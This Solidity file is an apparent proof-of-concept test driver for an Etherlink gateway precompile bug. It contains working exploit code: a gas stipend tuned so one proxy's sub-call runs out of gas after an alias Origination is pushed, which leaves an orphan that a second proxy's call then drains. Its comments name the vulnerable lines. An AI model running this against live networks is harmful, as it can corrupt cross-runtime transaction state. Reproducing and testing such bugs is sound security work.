// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Adversarial driver for the `pending_alias_origination_internals`
// orphan window in `resolve_aliases`
// (etherlink/kernel_latest/revm/src/precompiles/runtime_gateway.rs).
//
// The gateway PUSHES a fresh sender's alias-forwarder Origination onto
// the Michelson journal (line ~731, inside `tezosx_resolve_source_alias`
// Branch 3) BEFORE the fallible post-push gas charges at lines 741
// (`sender_gen_evm`) and 743 (`charge_delegated_storage_cost`). An OOG at
// 741/743 reverts the gateway precompile CALL frame; the REVM
// `checkpoint_revert` runs `global_revert -> michelson.revert_frame`,
// which does NOT clear `pending_alias_origination_internals`. The pushed
// Origination is therefore orphaned. The drain
// (`take_pending_alias_origination_internals`, mem::take) only runs at
// the entry of `execute_entrypoint_call` when a CRAC actually reaches
// `serve` (line ~995). An OOG at 741/743 happens BEFORE serve, so the
// orphan survives into the NEXT CRAC's drain.
//
// This contract deploys two child Proxy contracts (distinct, fresh EVM
// senders => distinct fresh Tezos aliases). In a single EVM transaction:
//   1. child1 is invoked with a tight gas stipend so its gateway sub-call
//      completes the push (alias materialization) but OOGs on the
//      post-push storage charge => caught (try/catch), CRAC #1 never
//      serves.
//   2. child2 is invoked with full gas: its gateway sub-call serves,
//      and on serve-entry drains the journal -- sweeping in the ORPHANED
//      alias(child1) Origination that does not belong to child2's CRAC.
//
// Storage layout (for RPC inspection):
//   slot 0: child1, slot 1: child2, slot 2: caught1 (1 if step 1 OOG'd)

contract Proxy {
    address constant GATEWAY = 0xfF00000000000000000000000000000000000007;

    function _buildCalldata(string memory destination)
        internal
        pure
        returns (bytes memory)
    {
        bytes memory url = abi.encodePacked("http://tezos/", destination, "/run");
        // Empty headers tuple array, Micheline Unit (0x030b), method=1 (POST).
        return
            abi.encodeWithSignature(
                "call(string,(string,string)[],bytes,uint8)",
                string(url),
                new bytes[](0),
                hex"030b",
                uint8(1)
            );
    }

    // Forwards to the gateway. The gateway sees `inputs.caller == this`,
    // so the materialized sender alias is alias(this) -- fresh per Proxy.
    function forward(string calldata destination) external payable {
        (bool ok, ) = GATEWAY.call{value: msg.value}(_buildCalldata(destination));
        require(ok, "gateway sub-call reverted");
    }
}

contract CracOogThenDrain {
    Proxy public child1;
    Proxy public child2;
    bool public caught1;

    string public dest1;
    string public dest2;

    constructor() {
        child1 = new Proxy();
        child2 = new Proxy();
    }

    function initialize(string calldata _dest1, string calldata _dest2)
        external
    {
        dest1 = _dest1;
        dest2 = _dest2;
    }

    // gasLimit: stipend for the FIRST (intentionally OOG'd) sub-call.
    // Tuned to land in the band "enough for alias push, not enough for
    // the post-push storage charge at runtime_gateway.rs:743".
    function run(uint256 gasLimit) external payable {
        // Step 1: fresh sender child1, tight gas => OOG after the push.
        try child1.forward{gas: gasLimit}(dest1) {
            // Unexpected: the sub-call completed. caught1 stays false so
            // the test can detect a mis-tuned stipend.
        } catch {
            caught1 = true;
        }
        // Step 2: fresh sender child2, full gas => serves and drains.
        // If step 1 orphaned alias(child1), child2's CRAC frame inherits
        // it via take_pending_alias_origination_internals.
        child2.forward(dest2);
    }

    // Control entrypoint: run ONLY the second sub-call (no orphan source).
    function runControlOnly() external payable {
        child2.forward(dest2);
    }
}
